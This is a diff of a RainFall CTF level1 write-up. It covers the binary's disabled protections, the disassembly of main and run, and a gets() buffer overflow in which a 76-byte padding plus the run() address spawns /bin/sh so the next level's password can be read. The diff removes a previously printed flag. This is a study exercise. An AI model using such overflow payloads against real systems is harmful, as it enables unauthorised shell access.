@@ -1,5 +1,6 @@
-## Exploring the Computer
+# Level1
 
+## Basic Info
 ```bash
 GCC stack protector support:            Enabled
 Strict user copy checks:                Disabled
@@ -11,6 +12,7 @@ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
 ```
+## Testing the program
 
 ```bash 
 level1@RainFall:~$ ./level1 
@@ -21,6 +23,7 @@ level1@RainFall:~$ ./level1
 
 We have an executable that quits after given an argument. 
 
+## Analysing the program
 
 ```bash 
 info functions
@@ -32,14 +35,48 @@ Non-debugging symbols:
 [...]
 ```
 
-Let's look at the main and run functions in detail in [asm_analysis](./Ressources/asm_analysis.md)
+There are two functions main and run. 
 
-# Our goal 
+### Main
+```bash 
+disas main
+Dump of assembler code for function main:
+   0x08048480 <+0>:	push   %ebp
+   0x08048481 <+1>:	mov    %esp,%ebp
+   0x08048483 <+3>:	and    $0xfffffff0,%esp
+   0x08048486 <+6>:	sub    $0x50,%esp
+   0x08048489 <+9>:	lea    0x10(%esp),%eax
+   0x0804848d <+13>:	mov    %eax,(%esp)
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leave  
+   0x08048496 <+22>:	ret    
+End of assembler dump.
+```
 
-We are going to overflow the main, so that the return address is the address of the run which will call /bin/sh giving us to a terminal where we will be able to call cat on the .passwd file. 
+We allocate 0x50 (80 in decimal) bytes on the stack with 'sub'. 
+Then 'lea' and 'mov', calculate the address of the variable located at esp + 0x10 and puts that address as argument for the 'gets()' call. 
+
+### Run
+```bash
+Address	        Instruction	            Explanation
+0x08048444	    push %ebp	            Save base pointer
+0x08048445	    mov %esp, %ebp	        Set up new stack frame
+0x08048447	    sub $0x18, %esp	        Reserve 24 bytes on the stack
+0x0804844a	    mov 0x80497c0, %eax	    Load a global variable (possibly stdout or a string)
+0x0804844f	    mov %eax, %edx	        Copy it into EDX
+0x08048451	    mov $0x8048570, %eax	Load address of a string to print (format string?)
+0x08048456–0x0804846a	                Prepare arguments for fwrite()
+```
+
+The run() function :
+Displays a message with fwrite()
+Executes a system command /bin/sh but it is never called in main
 
 
-## Buffer overflow
+## Getting access to the shell 
+
+We are going to overflow the main, so that the return address is the address of the run which will call /bin/sh giving us access to a terminal where we will be able to call cat on the .passwd file. 
+
 
 ```bash 
 set args < <(python -c 'print "A" * 80')
@@ -74,6 +111,7 @@ The address of the "run" function is "0x08048444" has seen above, that we will c
 $ python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
 level1@RainFall:~$ cat /tmp/payload - | ./level1
 Good... Wait what?
-$ cat /home/user/level2/.pass
-53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+$ 
 ```
+
+We have access let's [script it](./Ressources/exploit.py)! 
